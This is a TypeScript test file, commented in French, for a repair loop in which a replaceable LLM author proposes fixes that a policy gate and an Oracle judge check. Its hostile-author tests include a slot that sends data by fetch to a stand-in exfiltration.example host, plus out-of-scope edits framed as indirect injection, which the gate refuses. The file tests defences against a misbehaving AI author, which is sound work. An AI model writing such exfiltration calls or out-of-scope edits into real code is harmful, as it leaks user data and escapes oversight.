// BOUCLE DE RÉPARATION — PREUVES DES CRITÈRES DE SORTIE DE LA PHASE 9.
//
// Ports RÉELS : le simulateur est le compilateur déterministe, le juge est
// l'Oracle L1. Rien n'est simulé de ce qui doit être prouvé ; seul l'AUTEUR
// est déterministe (port LLM remplaçable — c'est précisément l'intérêt d'un
// port : le gate et le juge tiennent quel que soit l'auteur, y compris
// hostile, ce que prouvent les tests de mutation ci-dessous).
import { describe, expect, it } from "vitest";
import { canonicalJson } from "@deribfy/air-schema";
import { runRepairLoop } from "../src/loop.ts";
import { diagnose } from "../src/diagnose.ts";
import { RepairContractError, type RepairAuthor, type RepairState } from "../src/contracts.ts";
import { SLOTS_RESTO } from "./fixtures/slots-resto.ts";
import {
  BOUTON_COMMANDES,
  clone,
  loadAir,
  oracleSignal,
  oracleVerifier,
  provoquerBoutonMort,
  simulator,
} from "./harness.ts";

const AIR_SAIN = loadAir("resto-quartier.air.json");
const AIR_CASSE = provoquerBoutonMort(AIR_SAIN);
const etatCasse: RepairState = { air: AIR_CASSE, slots: [] };
const BUDGET = { maxAttempts: 3, maxTokens: 10_000 };
const SLOTS_COMPLETS = SLOTS_RESTO;

interface MutableAir {
  screens: { blocks: { id: string; props?: { key: string; value: unknown }[] }[] }[];
}

/** Auteur NOMINAL : applique la correction candidate DÉDUITE par le diagnostic. */
const auteurNominal: RepairAuthor = {
  id: "auteur-deterministe",
  propose({ diagnosis, state }) {
    const target = diagnosis.targets[0];
    if (target?.candidate === undefined || target.blockId === undefined) return null;
    const air = clone(state.air) as MutableAir;
    for (const screen of air.screens) {
      for (const block of screen.blocks) {
        if (block.id !== target.blockId) continue;
        const prop = (block.props ?? []).find((p) => p.key === "actionId");
        if (prop !== undefined) prop.value = target.candidate;
      }
    }
    return {
      authorId: "auteur-deterministe",
      next: { air, slots: state.slots },
      edits: [],
      tokens: 120,
      rationale: `actionId ${String(target.actionId)} → ${target.candidate}`,
    };
  },
};

describe("panne provoquée sur le slice 1 — bouton mort", () => {
  it("la panne est RÉELLE : l'Oracle refuse l'état cassé", () => {
    const verdict = oracleVerifier.verify(etatCasse);
    expect(verdict.passed).toBe(false);
    expect(verdict.checks.find((c) => c.name === "validateurs")?.detail).toContain(
      "BLOCK_ACTION_UNKNOWN",
    );
  });

  it("DIAGNOSE re-dérive la cause depuis l'AIR et DÉDUIT la correction", () => {
    const d = diagnose(oracleSignal(etatCasse), etatCasse);
    expect(d.repairClass).toBe("AIR_ACTION_DANGLING");
    expect(d.targets[0]?.blockId).toBe(BOUTON_COMMANDES);
    expect(d.targets[0]?.candidate).toBe("act_ouvrir_commandes");
    expect(d.evidence.join(" ")).toContain("absent de actions[]");
  });

  it("la boucle répare, committe, et restitue EXACTEMENT le document sain", () => {
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: BUDGET,
      author: auteurNominal,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.status).toBe("repaired");
    expect(outcome.attempts).toBe(1);
    expect(outcome.tokensSpent).toBe(120);
    // Preuve la plus forte disponible : l'AIR réparé est byte-identique au
    // document gelé d'origine (JSON canonique).
    expect(canonicalJson(outcome.state?.air)).toBe(canonicalJson(AIR_SAIN));
    // Les 9 étages de §10 sont tous journalisés, dans l'ordre.
    expect(outcome.journal.map((e) => e.stage)).toEqual([
      "diagnose",
      "classify",
      "plan",
      "impact",
      "simulate",
      "policy_gate",
      "apply",
      "verify",
      "commit",
    ]);
    expect(outcome.journal.every((e) => e.ok)).toBe(true);
  });

  it("ANALYSE D'IMPACT : artefact absent avant, projet complet après", () => {
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: BUDGET,
      author: auteurNominal,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.impact?.rootHashBefore).toBe("");
    expect(outcome.impact?.rootHashAfter).toMatch(/^[0-9a-f]{64}$/);
    expect(outcome.impact?.removed).toEqual([]);
    expect(outcome.journal.find((e) => e.stage === "simulate")?.detail).toContain(
      "l'état en panne ne compile pas",
    );
  });

  it("VÉRIFICATION ORACLE : l'état réparé passe tous les contrôles", () => {
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: BUDGET,
      author: auteurNominal,
      verifier: oracleVerifier,
      simulator,
    });
    const report = oracleVerifier.verify(outcome.state ?? etatCasse);
    expect(report.passed).toBe(true);
    expect(report.checks.map((c) => c.name)).toContain("slots_politique_ast");
  });
});

describe("gardes structurels — l'auteur hostile ne passe jamais", () => {
  const hostile = (
    id: string,
    build: (state: RepairState) => { next: RepairState; edits: { path: string; content: string }[] },
  ): RepairAuthor => ({
    id,
    propose({ state }) {
      const { next, edits } = build(state);
      return { authorId: id, next, edits, tokens: 200, rationale: `tentative ${id}` };
    },
  });

  it("juge = auteur : la boucle REFUSE de démarrer", () => {
    expect(() =>
      runRepairLoop({
        signal: oracleSignal(etatCasse),
        state: etatCasse,
        budget: BUDGET,
        author: { id: "oracle-l1", propose: () => null },
        verifier: oracleVerifier,
        simulator,
      }),
    ).toThrow(RepairContractError);
  });

  it("patch éditant une COPIE DE BLOC : refusé par le gate, jamais appliqué", () => {
    // L'auteur répare CORRECTEMENT l'AIR — et en profite pour réécrire une
    // copie de bloc. La réparation fonctionnelle ne rachète pas la
    // violation : §3 interdit toute édition en place d'une copie.
    const auteur = hostile("auteur-bloc", (state) => ({
      next: { air: clone(AIR_SAIN), slots: state.slots },
      edits: [{ path: "lib/blocks/components.tsx", content: "// bloc réécrit" }],
    }));
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: { maxAttempts: 2, maxTokens: 10_000 },
      author: auteur,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.status).not.toBe("repaired");
    expect(outcome.state).toBeUndefined();
    const gate = outcome.journal.filter((e) => e.stage === "policy_gate");
    expect(gate.every((e) => !e.ok)).toBe(true);
    expect(gate[0]?.detail).toContain("PATCH_BLOCK_COPY_EDIT");
    // Aucun étage APPLY n'a été atteint : le refus précède l'adoption.
    expect(outcome.journal.some((e) => e.stage === "apply")).toBe(false);
  });

  it("slot tentant un accès réseau direct : refusé par le gate", () => {
    const sain = clone(AIR_SAIN);
    const auteur = hostile("auteur-slot", () => ({
      next: {
        air: sain,
        slots: [
          {
            slotId: "slot_libelle_statut_commande",
            source:
              'export function runSlot(e: { statut: string }): { libelle: string } {\n' +
              '  fetch("https://exfiltration.example/c?s=" + e.statut);\n' +
              "  return { libelle: e.statut };\n}\n",
            authorId: "auteur-slot",
          },
        ],
      },
      edits: [{ path: "slots/slot_libelle_statut_commande.ts", content: "" }],
    }));
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: { maxAttempts: 2, maxTokens: 10_000 },
      author: auteur,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.status).not.toBe("repaired");
    expect(
      outcome.journal.filter((e) => e.stage === "policy_gate").some((e) => e.detail.includes("SLOT_NETWORK_ACCESS")),
    ).toBe(true);
    expect(outcome.journal.some((e) => e.stage === "apply")).toBe(false);
  });

  it("modification d'AIR HORS des cibles diagnostiquées : refusée", () => {
    // Scénario d'injection indirecte (§27) : l'auteur répare bien le bouton,
    // mais en profite pour ÉLARGIR les capabilities du projet. La réparation
    // est fonctionnellement correcte et l'Oracle l'accepterait ; le gate la
    // refuse parce qu'elle sort du périmètre que le diagnostic a établi.
    const auteur = hostile("auteur-opportuniste", () => {
      const air = clone(AIR_SAIN) as { app: { name: string } };
      air.app.name = "Maquis Express (édition pirate)";
      return { next: { air, slots: [] }, edits: [] };
    });
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: { maxAttempts: 1, maxTokens: 10_000 },
      author: auteur,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.status).not.toBe("repaired");
    const gate = outcome.journal.filter((e) => e.stage === "policy_gate");
    expect(gate.some((e) => e.detail.includes("PATCH_AIR_OUT_OF_TARGET"))).toBe(true);
    expect(gate.some((e) => e.detail.includes("app.name"))).toBe(true);
  });

  it("fichiers de slots ÉMIS ≠ fichiers DÉCLARÉS : refusés", () => {
    const auteur = hostile("auteur-silencieux", () => ({
      next: {
        air: clone(AIR_SAIN),
        slots: [
          {
            slotId: "slot_libelle_statut_commande",
            source: "export function runSlot(e: { statut: string }): { libelle: string } {\n  return { libelle: e.statut };\n}\n",
            authorId: "auteur-silencieux",
          },
        ],
      },
      // Le slot est LIVRÉ mais n'est PAS déclaré : le gate compare l'émission
      // réelle à la déclaration et refuse le passager clandestin.
      edits: [],
    }));
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: { maxAttempts: 1, maxTokens: 10_000 },
      author: auteur,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.status).not.toBe("repaired");
    expect(
      outcome.journal
        .filter((e) => e.stage === "policy_gate")
        .some((e) => e.detail.includes("PATCH_UNDECLARED_SLOT_EFFECT")),
    ).toBe(true);
  });

  it("réparation FONCTIONNELLE mais dégradant la grille A++ : REFUSÉE", () => {
    // Juge STUB : il isole EXACTEMENT la propriété testée — la réparation
    // est fonctionnellement bonne (contrôles verts) mais la grille perd la
    // dimension G. L'instrument A++ lui-même est éprouvé côté Oracle ; ici
    // c'est la DÉCISION de la boucle qui est prouvée.
    const jugeDegrade = {
      id: "juge-stub",
      verify(state: RepairState) {
        const casse = JSON.stringify(state.air) === JSON.stringify(AIR_CASSE);
        return {
          passed: !casse,
          checks: [{ name: "stub", passed: !casse, detail: casse ? "AIR cassé" : "AIR réparé" }],
          apxx: [
            { dimension: "A", state: "conforme" as const },
            { dimension: "G", state: casse ? ("conforme" as const) : ("non_conforme" as const) },
          ],
        };
      },
    };
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      reference: etatCasse,
      budget: { maxAttempts: 2, maxTokens: 10_000 },
      author: auteurNominal,
      verifier: jugeDegrade,
      simulator,
    });
    expect(outcome.status).not.toBe("repaired");
    expect(outcome.state).toBeUndefined();
    expect(
      outcome.journal
        .filter((e) => e.stage === "verify")
        .some((e) => e.detail.includes("régression A++ sur G")),
    ).toBe(true);
  });

  it("grille de référence absente : la boucle le DIT, elle ne feint pas", () => {
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: BUDGET,
      author: auteurNominal,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.status).toBe("repaired");
    expect(outcome.journal.some((e) => e.detail.includes("non-régression A++ NON ÉVALUABLE"))).toBe(true);
  });
});

describe("Budget Governor — la boucle est bornée", () => {
  const auteurEntete: RepairAuthor = {
    id: "auteur-entete",
    propose({ state }) {
      return {
        authorId: "auteur-entete",
        next: state, // ne répare rien : l'Oracle continuera de refuser
        edits: [],
        tokens: 300,
        rationale: "proposition inefficace",
      };
    },
  };

  it("borne d'itérations : arrêt PROPRE, escalade, aucun état livré", () => {
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: { maxAttempts: 3, maxTokens: 100_000 },
      author: auteurEntete,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.status).toBe("budget_exhausted");
    expect(outcome.attempts).toBe(3);
    expect(outcome.tokensSpent).toBe(900);
    expect(outcome.state).toBeUndefined();
  });

  it("borne de jetons : elle mord AVANT la borne d'itérations", () => {
    const outcome = runRepairLoop({
      signal: oracleSignal(etatCasse),
      state: etatCasse,
      budget: { maxAttempts: 50, maxTokens: 700 },
      author: auteurEntete,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.status).toBe("budget_exhausted");
    expect(outcome.attempts).toBe(3);
    expect(outcome.tokensSpent).toBe(900);
  });

  it("budget invalide : refus de contrat", () => {
    expect(() =>
      runRepairLoop({
        signal: oracleSignal(etatCasse),
        state: etatCasse,
        budget: { maxAttempts: 0, maxTokens: 10 },
        author: auteurNominal,
        verifier: oracleVerifier,
        simulator,
      }),
    ).toThrow(RepairContractError);
  });
});

describe("panne hors allowlist — escalade, jamais de bricolage", () => {
  it("classe inconnue : l'auteur n'est même pas sollicité", () => {
    let appele = false;
    const auteur: RepairAuthor = {
      id: "auteur-jamais-appele",
      propose: () => {
        appele = true;
        return null;
      },
    };
    const outcome = runRepairLoop({
      signal: { source: "oracle", checks: [{ name: "inconnu", passed: false, detail: "?" }] },
      state: { air: clone(AIR_SAIN), slots: SLOTS_COMPLETS },
      budget: BUDGET,
      author: auteur,
      verifier: oracleVerifier,
      simulator,
    });
    expect(outcome.status).toBe("not_repairable");
    expect(appele).toBe(false);
    expect(outcome.journal.map((e) => e.stage)).toEqual(["diagnose", "classify"]);
  });
});
